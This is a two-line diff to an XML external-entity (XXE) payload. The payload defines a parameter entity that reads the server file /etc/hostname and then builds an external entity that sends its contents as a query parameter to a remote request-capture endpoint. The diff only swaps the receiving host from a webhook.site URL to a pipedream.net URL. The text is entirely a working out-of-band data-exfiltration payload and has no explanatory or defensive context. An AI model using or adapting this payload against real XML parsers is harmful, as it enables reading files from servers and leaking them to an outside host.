@@ -1,2 +1,2 @@
 <!ENTITY % d SYSTEM "file:///etc/hostname">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'https://webhook.site/bbfc0d24-c32c-4851-a398-9710ad989228/?ex=%d;'>">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'https://f17d918b8ef3aba99402cfa81f53348c.m.pipedream.net/?ex=%d;'>">
